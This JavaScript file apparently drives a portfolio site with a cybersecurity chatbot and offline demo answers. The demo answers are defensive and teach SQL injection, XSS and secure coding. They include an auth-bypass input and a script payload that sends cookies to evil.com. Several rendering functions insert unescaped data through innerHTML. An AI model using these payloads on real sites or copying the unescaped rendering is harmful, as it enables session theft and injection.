/**
 * CYBAASH AI — Portfolio + Chatbot Script
 * Handles: data loading, chat UI, backend API calls, analysis tools
 */

/* ══════════════════════════════════════════════════════════════════
   CONFIG
   ══════════════════════════════════════════════════════════════════ */
const CONFIG = {
  // ⚙️  Change this to your deployed backend URL (Render / Railway / Heroku)
  BACKEND_URL: 'https://cybaash-ai.onrender.com',
  // Fallback: use local demo mode when backend is offline
  DEMO_MODE: false,
  SESSION_KEY: 'cybaash_session_' + Math.random().toString(36).slice(2, 9),
};

/* ══════════════════════════════════════════════════════════════════
   STATE
   ══════════════════════════════════════════════════════════════════ */
let backendOnline = false;
let activeToolId  = null;
let isSending     = false;

/* ══════════════════════════════════════════════════════════════════
   INIT
   ══════════════════════════════════════════════════════════════════ */
document.addEventListener('DOMContentLoaded', async () => {
  updateClock();
  setInterval(updateClock, 1000);

  typeWriter('Mohamed Aasiq', 'typed-name', 80);
  await loadPortfolioData();
  checkBackend();
  setInterval(checkBackend, 30000);
  setupFileDrop();
});

function updateClock() {
  const el = document.getElementById('topbar-time');
  if (el) el.textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
}

/* ══════════════════════════════════════════════════════════════════
   TYPEWRITER EFFECT
   ══════════════════════════════════════════════════════════════════ */
function typeWriter(text, elementId, speed = 80) {
  const el = document.getElementById(elementId);
  if (!el) return;
  let i = 0;
  el.textContent = '';
  const interval = setInterval(() => {
    el.textContent += text[i++];
    if (i >= text.length) clearInterval(interval);
  }, speed);
}

/* ══════════════════════════════════════════════════════════════════
   PORTFOLIO DATA LOADING
   ══════════════════════════════════════════════════════════════════ */
async function loadPortfolioData() {
  try {
    const res = await fetch('data_main.json');
    if (!res.ok) throw new Error('data_main.json not found');
    const data = await res.json();
    populateAbout(data.about, data.contact);
    populateSkills(data.skills);
    populateExperience(data.experience);
    populateProjects(data.projects);
  } catch (e) {
    console.warn('Portfolio data load failed:', e);
  }
}

function populateAbout(about, contact) {
  setText('about-bio', about.bio);
  setText('hero-bio', about.bio);
  setText('meta-location', about.location);
  setText('meta-langs', contact.languages);
  setText('meta-spec', contact.specialization);
  setText('stat-exp', (about.yearsExp || '8') + '+');
  setText('contact-cta', contact.ctaMessage);
  setLink('contact-email', `mailto:${contact.email}`, contact.email);
  setText('contact-phone', contact.phone);
  setLink('contact-github', contact.github, contact.github);
  setLink('contact-li', contact.linkedin, contact.linkedin);
}

function populateSkills(skills) {
  const filterEl = document.getElementById('skills-filter');
  const gridEl   = document.getElementById('skills-grid');
  if (!filterEl || !gridEl) return;

  // Build filter buttons
  filterEl.innerHTML = `<button class="filter-btn active" data-cat="all" onclick="filterSkills('all',this)">ALL</button>`;
  skills.forEach(cat => {
    filterEl.innerHTML += `<button class="filter-btn" data-cat="${cat.id}" onclick="filterSkills('${cat.id}',this)">${cat.name.toUpperCase()}</button>`;
  });

  // Build skill items
  gridEl.innerHTML = '';
  skills.forEach(cat => {
    cat.items.forEach(sk => {
      const level = sk.level || 'Intermediate';
      const levelClass = 'level-' + level.toLowerCase().replace(' ', '');
      gridEl.innerHTML += `
        <div class="skill-item" data-cat="${cat.id}">
          <span class="skill-name">${sk.name}</span>
          <span class="skill-level ${levelClass}">${level.toUpperCase()}</span>
        </div>`;
    });
  });
}

function filterSkills(catId, btn) {
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.skill-item').forEach(el => {
    el.style.display = (catId === 'all' || el.dataset.cat === catId) ? '' : 'none';
  });
}

function populateExperience(experience) {
  const el = document.getElementById('exp-timeline');
  if (!el) return;
  el.innerHTML = '';
  experience.forEach(exp => {
    const isCurrent = exp.current;
    el.innerHTML += `
      <div class="timeline-item ${isCurrent ? 'current' : ''}">
        <div class="exp-header">
          <div>
            <div class="exp-role">${exp.role}</div>
            <div class="exp-company">${exp.company} ${exp.country || ''} · ${exp.location}</div>
            <div class="exp-type">${exp.type}</div>
          </div>
          <div style="text-align:right">
            <div class="exp-date">${exp.startDate} — ${exp.current ? '<span class="current-badge">CURRENT</span>' : (exp.endDate || '')}</div>
          </div>
        </div>
        <div class="exp-desc">${exp.desc}</div>
        ${exp.achievements?.length ? `
          <ul class="exp-achievements">
            ${exp.achievements.map(a => `<li>${a}</li>`).join('')}
          </ul>` : ''}
      </div>`;
  });
}

function populateProjects(projects) {
  const el = document.getElementById('projects-grid');
  if (!el) return;
  el.innerHTML = '';
  projects.forEach(p => {
    el.innerHTML += `
      <div class="project-card">
        ${p.image ? `<img src="${p.image}" alt="${p.title}" class="project-img" onerror="this.style.display='none'">` : ''}
        <div class="project-body">
          <div class="project-title">${p.title}</div>
          <div class="project-desc">${p.desc}</div>
          ${p.status ? `<div class="project-status">${p.status.toUpperCase()}</div>` : ''}
          <div class="project-links">
            ${p.liveUrl ? `<a href="${p.liveUrl}" target="_blank" class="project-link">🔗 Live Site</a>` : ''}
            ${p.githubUrl ? `<a href="${p.githubUrl}" target="_blank" class="project-link">🐙 GitHub</a>` : ''}
          </div>
        </div>
      </div>`;
  });
}

/* ══════════════════════════════════════════════════════════════════
   BACKEND STATUS CHECK
   ══════════════════════════════════════════════════════════════════ */
async function checkBackend() {
  const el = document.getElementById('backend-status');
  try {
    const res = await fetch(`${CONFIG.BACKEND_URL}/api/health`, {
      signal: AbortSignal.timeout(5000),
    });
    if (res.ok) {
      backendOnline = true;
      if (el) { el.textContent = '● Backend Online'; el.className = 'status-online'; }
    } else throw new Error('not ok');
  } catch {
    backendOnline = false;
    if (el) { el.textContent = '● Demo Mode (no backend)'; el.className = 'status-offline'; }
  }
}

/* ══════════════════════════════════════════════════════════════════
   CHAT FUNCTIONS
   ══════════════════════════════════════════════════════════════════ */
function handleKeyDown(e) {
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();
    sendMessage();
  }
}

function autoResize(el) {
  el.style.height = 'auto';
  el.style.height = Math.min(el.scrollHeight, 140) + 'px';
}

function injectPrompt(text) {
  const input = document.getElementById('chat-input');
  if (input) {
    input.value = text;
    autoResize(input);
    input.focus();
    scrollToChat();
  }
}

function scrollToChat() {
  document.getElementById('cybaash-ai')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

async function sendMessage() {
  if (isSending) return;
  const input = document.getElementById('chat-input');
  const message = input.value.trim();
  if (!message) return;

  isSending = true;
  input.value = '';
  autoResize(input);
  document.getElementById('send-btn').disabled = true;

  // Add user bubble
  appendMessage('user', message);

  // Show typing indicator
  showTyping(true);

  try {
    let reply, flags = [];

    if (backendOnline) {
      const data = await callChatAPI(message);
      reply = data.reply;
      flags = data.security_flags || [];
    } else {
      // Demo mode — local fallback
      reply = localDemoResponse(message);
    }

    showTyping(false);
    appendMessage('bot', reply, flags);

  } catch (err) {
    showTyping(false);
    appendMessage('bot', '⚠️ **Connection error.** The backend may be offline. Please check the README to set up the backend, or deploy it to Render.\n\n> Running in demo mode — some features limited.');
  }

  isSending = false;
  document.getElementById('send-btn').disabled = false;
  input.focus();
}

async function callChatAPI(message) {
  const res = await fetch(`${CONFIG.BACKEND_URL}/api/chat`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      message,
      session_id: CONFIG.SESSION_KEY,
    }),
    signal: AbortSignal.timeout(30000),
  });
  if (!res.ok) throw new Error(`API error ${res.status}`);
  return res.json();
}

function appendMessage(role, text, flags = []) {
  const container = document.getElementById('chat-messages');
  const isBot = role === 'bot';
  const time = new Date().toLocaleTimeString('en-US', { hour:'2-digit', minute:'2-digit', hour12:true });

  const div = document.createElement('div');
  div.className = `message ${isBot ? 'bot' : 'user'}-message`;

  const renderedText = isBot && window.marked
    ? window.marked.parse(text)
    : escapeHtml(text).replace(/\n/g, '<br>');

  const flagsHTML = flags.length
    ? `<div class="msg-flags">${flags.map(f => `<span class="flag-badge">⚠ ${f}</span>`).join('')}</div>`
    : '';

  div.innerHTML = `
    <div class="msg-avatar ${isBot ? 'bot' : 'user'}-avatar">${isBot ? '⚡' : 'YOU'}</div>
    <div class="msg-bubble">
      <div class="msg-header">${isBot ? 'CYBAASH AI' : 'YOU'} <span class="msg-time">${time}</span></div>
      <div class="msg-text markdown-content">${renderedText}</div>
      ${flagsHTML}
    </div>`;

  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

function showTyping(show) {
  const el = document.getElementById('typing-indicator');
  if (el) el.style.display = show ? 'flex' : 'none';
  if (show) {
    document.getElementById('chat-messages').scrollTop = 999999;
  }
}

function clearChat() {
  const container = document.getElementById('chat-messages');
  container.innerHTML = '';
  appendMessage('bot', '🔄 **Chat cleared.** Session history reset. How can I help you with cybersecurity?');
}

/* ══════════════════════════════════════════════════════════════════
   TOOL PANELS
   ══════════════════════════════════════════════════════════════════ */
function openTool(toolId) {
  const panel = document.getElementById('tool-panel');
  const allTools = ['url', 'password', 'code', 'file'];

  if (activeToolId === toolId) {
    // Toggle off
    panel.style.display = 'none';
    activeToolId = null;
    document.querySelectorAll('.chat-tool-btn').forEach(b => b.classList.remove('active'));
    return;
  }

  activeToolId = toolId;
  panel.style.display = 'block';

  // Show correct tool
  allTools.forEach(id => {
    const el = document.getElementById(`tool-${id}`);
    if (el) el.style.display = id === toolId ? 'flex' : 'none';
    if (el && id === toolId) el.style.flexDirection = 'column';
  });

  // Highlight active button
  document.querySelectorAll('.chat-tool-btn').forEach(b => b.classList.remove('active'));
  document.getElementById(`btn-${toolId}`)?.classList.add('active');
}

/* ── URL CHECKER ─────────────────────────────────────────────────── */
async function runUrlCheck() {
  const input = document.getElementById('url-input').value.trim();
  if (!input) return;
  const resultEl = document.getElementById('url-result');
  resultEl.innerHTML = '<div class="loading-pulse">Scanning URL...</div>';

  try {
    let result;
    if (backendOnline) {
      const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/url`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: input }),
      });
      result = await res.json();
    } else {
      result = localUrlCheck(input);
    }
    resultEl.innerHTML = renderUrlResult(result);
  } catch (e) {
    resultEl.innerHTML = `<div class="result-card high"><div class="result-title">ERROR</div><div>${escapeHtml(e.message)}</div></div>`;
  }
}

function renderUrlResult(r) {
  const riskClass = r.risk_level?.toLowerCase() || 'safe';
  const flagItems = (r.flags || []).map(f => `<div class="result-flag-item">${f}</div>`).join('');
  return `
    <div class="result-card ${riskClass}">
      <div class="result-title">URL ANALYSIS · ${r.host || r.url}</div>
      <div class="result-risk risk-${riskClass}">${r.risk_level} ${riskClass === 'safe' ? '✓' : '⚠'}</div>
      <div style="font-family:var(--font-mono);font-size:.7rem;color:var(--dim)">Score: ${r.risk_score}/100</div>
      ${flagItems ? `<div class="result-flags">${flagItems}</div>` : ''}
      <div style="margin-top:10px;font-size:.8rem;color:var(--text)">${r.recommendation || ''}</div>
    </div>`;
}

/* ── PASSWORD CHECKER ────────────────────────────────────────────── */
async function runPasswordCheck() {
  const pw = document.getElementById('pass-input').value;
  if (!pw) return;
  const resultEl = document.getElementById('pass-result');

  try {
    let result;
    if (backendOnline) {
      const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: pw }),
      });
      result = await res.json();
    } else {
      result = localPasswordCheck(pw);
    }
    resultEl.innerHTML = renderPasswordResult(result);
  } catch (e) {
    resultEl.innerHTML = `<div class="loading-pulse">Error: ${escapeHtml(e.message)}</div>`;
  }
}

function renderPasswordResult(r) {
  const barWidth = r.score || 0;
  const feedbackItems = (r.feedback || []).map(f => `<li>${f}</li>`).join('');
  return `
    <div class="result-card">
      <div class="result-title">PASSWORD STRENGTH</div>
      <div class="pw-score" style="color:${r.color || '#fff'}">${r.strength}</div>
      <div class="pw-meter">
        <div class="pw-bar-bg"><div class="pw-bar-fill" style="width:${barWidth}%;background:${r.color || '#fff'}"></div></div>
        <div style="font-family:var(--font-mono);font-size:.7rem;color:var(--dim)">${barWidth}/100 · ~${r.entropy_bits || 0} bits entropy · Length: ${r.length}</div>
      </div>
      <ul class="pw-feedback">${feedbackItems}</ul>
    </div>`;
}

/* ── CODE SCANNER ────────────────────────────────────────────────── */
async function runCodeScan() {
  const code = document.getElementById('code-input').value.trim();
  const lang = document.getElementById('code-lang').value;
  if (!code) return;
  const resultEl = document.getElementById('code-result');
  resultEl.innerHTML = '<div class="loading-pulse">Scanning code...</div>';

  try {
    let result;
    if (backendOnline) {
      const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code, language: lang }),
      });
      result = await res.json();
    } else {
      result = localCodeScan(code, lang);
    }
    resultEl.innerHTML = renderCodeResult(result);
  } catch (e) {
    resultEl.innerHTML = `<div class="loading-pulse">Error: ${escapeHtml(e.message)}</div>`;
  }
}

function renderCodeResult(r) {
  const riskClass = (r.risk_level || 'SAFE').toLowerCase();
  const issues = (r.issues || []).map(i => `
    <div class="issue-item ${i.severity}">
      <div class="issue-header">
        <span class="issue-sev ${i.severity}">${i.severity}</span>
        <span class="issue-desc">${i.description}</span>
      </div>
      <div class="issue-line">Line ${i.line}</div>
      ${i.snippet ? `<div class="issue-snippet">${escapeHtml(i.snippet)}</div>` : ''}
    </div>`).join('');
  return `
    <div class="result-card ${riskClass}">
      <div class="result-title">CODE ANALYSIS · ${r.language?.toUpperCase()} · ${r.lines_scanned} lines</div>
      <div class="result-risk risk-${riskClass}">${r.risk_level} — ${r.total_issues} issue(s)</div>
      <div style="font-family:var(--font-mono);font-size:.7rem;color:var(--dim);margin:6px 0">
        🔴 HIGH: ${r.summary?.HIGH || 0} · 🟠 MEDIUM: ${r.summary?.MEDIUM || 0} · 🟡 LOW: ${r.summary?.LOW || 0}
      </div>
      ${issues ? `<div class="issues-list">${issues}</div>` : '<div style="color:var(--green);font-size:.85rem">✓ No issues detected</div>'}
    </div>`;
}

/* ── FILE UPLOAD ─────────────────────────────────────────────────── */
function setupFileDrop() {
  const zone = document.getElementById('file-drop');
  if (!zone) return;
  zone.addEventListener('dragover', e => { e.preventDefault(); zone.style.borderColor = 'var(--blue)'; });
  zone.addEventListener('dragleave', () => { zone.style.borderColor = ''; });
  zone.addEventListener('drop', e => {
    e.preventDefault();
    zone.style.borderColor = '';
    const file = e.dataTransfer?.files[0];
    if (file) processFile(file);
  });
}

async function runFileAnalysis(input) {
  const file = input.files?.[0];
  if (!file) return;
  processFile(file);
}

async function processFile(file) {
  const resultEl = document.getElementById('file-result');
  const safeName = escapeHtml(file.name);
  resultEl.innerHTML = `<div class="loading-pulse">Analyzing ${safeName}...</div>`;

  if (!backendOnline) {
    resultEl.innerHTML = `
      <div class="result-card medium">
        <div class="result-title">FILE: ${safeName}</div>
        <div style="color:var(--orange)">Backend offline — connect backend for file analysis.</div>
        <div style="font-size:.8rem;color:var(--dim);margin-top:8px">Size: ${(file.size/1024).toFixed(1)} KB · Deploy the Python backend to enable this feature.</div>
      </div>`;
    return;
  }

  try {
    const formData = new FormData();
    formData.append('file', file);
    const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/file`, {
      method: 'POST',
      body: formData,
    });
    const result = await res.json();
    resultEl.innerHTML = renderFileResult(result, file.name);
  } catch (e) {
    resultEl.innerHTML = `<div class="loading-pulse">Error: ${escapeHtml(e.message)}</div>`;
  }
}

function renderFileResult(r, filename) {
  const riskClass = (r.risk_level || 'SAFE').toLowerCase();
  const secrets = (r.secrets_detected || []).map(s =>
    `<div class="result-flag-item">[Line ${s.line}] ${s.type}: ${s.redacted}</div>`).join('');
  const issues = (r.issues || []).slice(0, 10).map(i => `
    <div class="issue-item ${i.severity}">
      <div class="issue-header">
        <span class="issue-sev ${i.severity}">${i.severity}</span>
        <span class="issue-desc">${i.description}</span>
      </div>
      <div class="issue-line">Line ${i.line}</div>
    </div>`).join('');
  return `
    <div class="result-card ${riskClass}">
      <div class="result-title">FILE SCAN · ${filename}</div>
      <div class="result-risk risk-${riskClass}">${r.risk_level}</div>
      <div style="font-family:var(--font-mono);font-size:.7rem;color:var(--dim);margin:6px 0">
        ${r.size_bytes ? `Size: ${(r.size_bytes/1024).toFixed(1)} KB · ` : ''}${r.lines_scanned || 0} lines
      </div>
      ${secrets ? `<div class="result-flags"><div style="color:var(--red);font-family:var(--font-mono);font-size:.7rem;margin-bottom:4px">🔑 SECRETS DETECTED:</div>${secrets}</div>` : ''}
      ${issues ? `<div class="issues-list">${issues}</div>` : '<div style="color:var(--green);font-size:.85rem">✓ No issues detected</div>'}
    </div>`;
}

/* ══════════════════════════════════════════════════════════════════
   LOCAL DEMO FALLBACKS (when backend is offline)
   ══════════════════════════════════════════════════════════════════ */
function localDemoResponse(message) {
  const msg = message.toLowerCase();
  if (msg.match(/sql|sqli|injection/)) return `## SQL Injection (SQLi)\n\n**What it is:** An attacker manipulates database queries by injecting malicious SQL.\n\n\`\`\`sql\n-- Vulnerable input: ' OR '1'='1\nSELECT * FROM users WHERE user = '' OR '1'='1'  -- bypasses auth!\n\`\`\`\n\n**Defense:**\n- ✅ Use parameterized queries / prepared statements\n- ✅ Use an ORM (SQLAlchemy, Prisma)\n- ✅ Validate all user inputs\n\n\`\`\`python\n# ❌ Vulnerable\nquery = f"SELECT * FROM users WHERE name = '{user_input}'"\n\n# ✅ Safe\ncursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))\n\`\`\`\n\n> OWASP: A03:2021 Injection`;
  if (msg.match(/xss|cross.site scri/)) return `## Cross-Site Scripting (XSS)\n\n**What it is:** Attacker injects malicious JavaScript into pages viewed by users.\n\n**Attack:** \`<script>fetch('https://evil.com?c='+document.cookie)</script>\`\n\n**Defense:**\n- ✅ Escape output (htmlspecialchars, template auto-escaping)\n- ✅ Content Security Policy (CSP) headers\n- ✅ Use \`textContent\` not \`innerHTML\`\n- ✅ HttpOnly cookie flags\n\n> OWASP: A03:2021 Injection`;
  if (msg.match(/csrf|cross.site req/)) return `## CSRF — Cross-Site Request Forgery\n\nTricks authenticated users into making unwanted requests.\n\n**Defense:**\n- ✅ CSRF tokens in every state-changing form\n- ✅ \`SameSite=Strict\` cookies\n- ✅ Verify Origin/Referer headers\n\n> OWASP: A01:2021 Broken Access Control`;
  if (msg.match(/password|passwd|hash|bcrypt/)) return `## Secure Password Storage\n\nNever store passwords in plain text!\n\n| Algorithm | Safe? |\n|-----------|-------|\n| MD5/SHA1 | ❌ No |\n| bcrypt | ✅ Yes |\n| Argon2id | ✅ Best |\n\n\`\`\`python\nimport bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\nbcrypt.checkpw(password.encode(), hashed)  # verify\n\`\`\``;
  if (msg.match(/owasp/)) return `## OWASP Top 10 (2021)\n\n1. **A01** — Broken Access Control\n2. **A02** — Cryptographic Failures\n3. **A03** — Injection (SQLi, XSS)\n4. **A04** — Insecure Design\n5. **A05** — Security Misconfiguration\n6. **A06** — Vulnerable Components\n7. **A07** — Identification & Auth Failures\n8. **A08** — Software Integrity Failures\n9. **A09** — Logging & Monitoring Failures\n10. **A10** — Server-Side Request Forgery\n\n> Deploy the Python backend with your Gemini key for full AI responses!`;
  if (msg.match(/buffer overflow|bof/)) return `## Buffer Overflow\n\nWriting beyond allocated memory to overwrite execution pointers.\n\n\`\`\`c\nchar buffer[64];\ngets(buffer);  // ❌ unbounded — fgets(buffer, sizeof(buffer), stdin) ✅\n\`\`\`\n\n**Defenses:** ASLR, Stack Canaries, NX/DEP, use memory-safe languages (Rust, Go)`;
  if (msg.match(/pentest|penetration|ethical hack/)) return `## Penetration Testing Phases\n\n1. **Reconnaissance** — OSINT, Shodan, nmap\n2. **Scanning** — Port scan, service enum\n3. **Exploitation** — Authorized systems only\n4. **Post-exploitation** — Privilege escalation\n5. **Reporting** — CVSS scores, remediation\n\n⚠️ Always have **written authorization** before testing!`;
  if (msg.match(/hi|hello|hey|help|what can/i)) return `# 👾 Welcome to CYBAASH AI!\n\nI'm your AI cybersecurity assistant. Ask me about:\n- 🔍 Vulnerabilities: SQLi, XSS, CSRF, Buffer Overflow\n- 💻 Secure coding in Python, JavaScript, PHP\n- ⚔️ Penetration testing methodology\n- 🔐 Password security & cryptography\n- 🛡️ OWASP Top 10\n\n> 💡 Deploy the Python backend and add your Gemini key for full AI-powered responses!`;
  return `I'm running in **demo mode** (backend offline).\n\nTo get full AI responses, deploy the Python backend:\n1. \`cd backend && pip install -r requirements.txt\`\n2. Add \`OPENAI_API_KEY\` to \`.env\`\n3. \`python main.py\`\n\nOr deploy to Render.com — see **README.md** for instructions.\n\n**Try asking:** SQLi, XSS, CSRF, buffer overflow, OWASP, penetration testing, password security`;
}

function localUrlCheck(url) {
  const flags = [];
  let score = 0;
  if (url.startsWith('http://')) { flags.push('Non-HTTPS — unencrypted'); score += 20; }
  if (/\d{1,3}\.\d{1,3}\.\d{1,3}/.test(url)) { flags.push('IP address URL — possible phishing'); score += 20; }
  if (/bit\.ly|tinyurl|t\.co/.test(url)) { flags.push('URL shortener — destination hidden'); score += 15; }
  if (/(login|signin|verify|secure|update)/.test(url)) { flags.push('Suspicious action keyword'); score += 10; }
  const risk = score >= 50 ? 'HIGH' : score >= 30 ? 'MEDIUM' : score >= 15 ? 'LOW' : 'SAFE';
  return { url, risk_level: risk, risk_score: score, flags, host: url.split('/')[2] || url, recommendation: risk === 'SAFE' ? 'URL appears safe.' : 'Proceed with caution.' };
}

function localPasswordCheck(pw) {
  let score = 0;
  const feedback = [];
  if (pw.length >= 16) score += 35; else if (pw.length >= 12) score += 25; else { score += 10; feedback.push('Use at least 12 characters'); }
  if (/[a-z]/.test(pw)) score += 8; else feedback.push('Add lowercase letters');
  if (/[A-Z]/.test(pw)) score += 8; else feedback.push('Add uppercase letters');
  if (/\d/.test(pw)) score += 8; else feedback.push('Add numbers');
  if (/[!@#$%^&*]/.test(pw)) score += 8; else feedback.push('Add special characters');
  score = Math.min(100, score);
  const strength = score >= 80 ? 'VERY STRONG' : score >= 60 ? 'STRONG' : score >= 40 ? 'MODERATE' : score >= 20 ? 'WEAK' : 'VERY WEAK';
  const color = score >= 80 ? '#00ff88' : score >= 60 ? '#00d4ff' : score >= 40 ? '#ffd700' : score >= 20 ? '#ff6600' : '#ff2244';
  if (!feedback.length) feedback.push('Great password! Use a password manager.');
  return { score, strength, color, length: pw.length, entropy_bits: Math.round(pw.length * 4.5), feedback };
}

function localCodeScan(code, lang) {
  const issues = [];
  const checks = [
    { pattern: /\beval\s*\(/, desc: 'eval() — code execution risk', severity: 'HIGH' },
    { pattern: /\bexec\s*\(/, desc: 'exec() — code execution risk', severity: 'HIGH' },
    { pattern: /shell\s*=\s*True/, desc: 'shell=True — command injection', severity: 'HIGH' },
    { pattern: /innerHTML\s*=/, desc: 'innerHTML — XSS risk', severity: 'MEDIUM' },
    { pattern: /Math\.random\(\)/, desc: 'Math.random() — not cryptographically secure', severity: 'LOW' },
    { pattern: /hashlib\.(md5|sha1)/, desc: 'Weak hash (MD5/SHA1)', severity: 'MEDIUM' },
  ];
  const lines = code.split('\n');
  checks.forEach(c => {
    lines.forEach((line, i) => {
      if (c.pattern.test(line)) issues.push({ line: i+1, severity: c.severity, description: c.desc, snippet: line.trim() });
    });
  });
  const highCount = issues.filter(i => i.severity === 'HIGH').length;
  const medCount  = issues.filter(i => i.severity === 'MEDIUM').length;
  const lowCount  = issues.filter(i => i.severity === 'LOW').length;
  return {
    language: lang === 'auto' ? 'detected' : lang,
    issues, total_issues: issues.length,
    lines_scanned: lines.length,
    risk_level: highCount ? 'HIGH' : medCount ? 'MEDIUM' : lowCount ? 'LOW' : 'SAFE',
    summary: { HIGH: highCount, MEDIUM: medCount, LOW: lowCount },
  };
}

/* ══════════════════════════════════════════════════════════════════
   UTILITIES
   ══════════════════════════════════════════════════════════════════ */
function setText(id, text) {
  const el = document.getElementById(id);
  if (el && text) el.textContent = text;
}

function setLink(id, href, text) {
  const el = document.getElementById(id);
  if (el) { el.href = href; if (text) el.textContent = text; }
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
